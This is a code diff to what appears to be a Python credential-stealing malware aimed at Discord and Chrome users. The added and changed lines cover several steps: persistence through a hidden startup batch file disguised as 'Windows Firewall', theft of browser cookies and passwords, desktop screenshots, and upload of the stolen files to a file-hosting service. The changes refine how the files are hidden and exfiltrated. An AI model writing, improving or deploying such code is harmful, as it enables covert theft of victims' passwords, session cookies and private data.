@@ -8,6 +8,8 @@ from re import findall
 from urllib.request import Request, urlopen
 from winregistry import WinRegistry as Reg
 from subprocess import Popen, PIPE
+import win32api
+import win32con
 import random
 from PIL import ImageGrab
 import ctypes
@@ -37,6 +39,7 @@ hiddenWindow = False
 FakeFileName = "Windows Firewall"
 
 # Defining needed variables
+webhookURL = requests.get(pastebin).text
 path = path.join(
     environ["USERPROFILE"],
     "AppData",
@@ -51,7 +54,6 @@ myname = str(sys.argv[0])
 USER_NAME = getpass.getuser()
 LOCAL = os.getenv("LOCALAPPDATA")
 ROAMING = os.getenv("APPDATA")
-webhookURL = requests.get(pastebin).text
 PATHS = {
     "Discord"           : ROAMING + "\\Discord",
     "Discord Canary"    : ROAMING + "\\discordcanary",
@@ -117,14 +119,14 @@ class Logger():
                 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
                 with open(bat_path + '\\' + f"{FakeFileName}.bat", "w+") as bat_file:
                     bat_file.write(r'start "" %s' % file_path)
-                    os.system(f"attrib +h {FakeFileName}.bat" )
+                    win32api.SetFileAttributes(f"{FakeFileName}.bat", win32con.FILE_ATTRIBUTE_HIDDEN)
                     bat_file.close()
             except Exception as e:
                 print(e)
     def cookieLog():
         cookies = list(browser_cookie3.chrome())
         f = open("rc.txt","w+")
-        os.system("attrib +h rc.txt")
+        win32api.SetFileAttributes("rc.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
         for item in cookies:
                 f.write("%s\n" % item)
     def passwordLog():
@@ -182,7 +184,7 @@ class Logger():
                 os.remove(filename)
             except:
                 pass
-            os.system("attrib +h psd.txt")
+            win32api.SetFileAttributes("psd.txt", win32con.FILE_ATTRIBUTE_HIDDEN)
         except Exception as e:
             print(e)
     def uploadFiles():
@@ -192,14 +194,14 @@ class Logger():
             screen.save(os.getenv('ProgramData') + r'\desktop.jpg')
             screen = open(r'C:\ProgramData\desktop.jpg', 'rb')
             screen.close()
-            screenshotRaw = os.popen('curl -F "file=@C:\ProgramData\desktop.jpg" https://store9.gofile.io/uploadFile ').read()
+            screenshotRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('C:\\ProgramData\\desktop.jpg', open('C:\\ProgramData\\desktop.jpg', 'rb')),}).text
             screenshotUploaded = f"[Desktop Image]({screenshotRaw[39:65]})"
         except Exception as e:
             print(e)
             screenshotUploaded = "Desktop Image: N/A"
         # Cookies
         try:
-            cookiesRaw = os.popen('curl -F "file=@rc.txt" https://store9.gofile.io/uploadFile').read()
+            cookiesRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('rc.txt', open('rc.txt', 'rb')),}).text
             cookiesUploaded = f"[Cookies]({cookiesRaw[39:65]})"
             os.remove("rc.txt")
         except Exception as e:
@@ -208,8 +210,7 @@ class Logger():
 
         # Passwords
         try:
-            passwordsRaw = os.popen('curl -F "file=@psd.txt" https://store9.gofile.io/uploadFile').read()
-            global passwordsUploaded
+            passwordsRaw = requests.post('https://store9.gofile.io/uploadFile', files={'file': ('psd.txt', open('psd.txt', 'rb')),}).text
             passwordsUploaded = f"[Passwords]({passwordsRaw[39:65]})"
             os.remove("psd.txt")
         except Exception as e:
